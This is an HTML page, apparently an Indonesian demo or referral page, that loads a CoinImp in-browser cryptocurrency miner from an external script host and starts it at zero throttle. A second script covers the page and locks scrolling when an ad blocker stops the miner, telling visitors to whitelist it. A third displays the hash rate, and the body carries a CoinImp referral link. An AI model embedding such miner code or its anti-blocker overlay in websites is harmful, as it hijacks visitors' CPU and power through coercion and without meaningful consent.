<html>
<head>
<script src="https://www.hostingcloud.racing/JP6z.js"></script>
<script>
    var _client = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
        throttle: 0, c: 'w'
    });
    _client.start();
    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");

</script>
<script>
    setTimeout(function(){
        if(typeof _client === 'undefined' || _client === null)
        {
            var messageDiv = document.createElement("div");
            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
            var mainDiv = document.createElement("div");
            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
            mainDiv.appendChild(messageDiv);
            document.body.appendChild(mainDiv);
            document.getElementsByTagName("body")[0].style.overflow = "hidden";
            window.scrollTo(0, 0);
        }
    },1000);
</script>
<script>
setTimeout(function(){
    let div = document.createElement("div");
    document.body.appendChild(div);
    setInterval(function(){
        let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
        let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
        div.innerHTML = `Speed: ${speed} Hashes/s<br>Total Hash: ${total}`;
    },500);
},1000);
</script>
</head>
<body>
Kalo ada yang mau buat klik link dibawah ini
<br>
<a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">https://www.coinimp.com/</a>
</body>
</html>
